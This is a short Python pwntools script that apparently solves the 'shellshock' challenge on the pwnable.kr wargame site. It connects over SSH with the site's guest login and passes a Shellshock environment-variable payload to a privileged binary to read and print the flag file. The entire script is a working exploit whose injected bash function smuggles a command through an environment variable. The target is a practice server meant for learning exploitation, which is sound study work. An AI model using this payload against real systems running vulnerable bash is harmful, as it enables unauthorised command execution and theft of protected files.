from pwn import *

context(arch='amd64', os='linux', log_level='error')

sh = ssh('shellshock', 'pwnable.kr', password='guest', port=2222)

# https://github.com/mubix/shellshocker-pocs
output = sh("env X='() { _; } >_[$($())] { cat flag; }' ./shellshock :") 

flag = output.split(b'\n')[0]

print(flag)
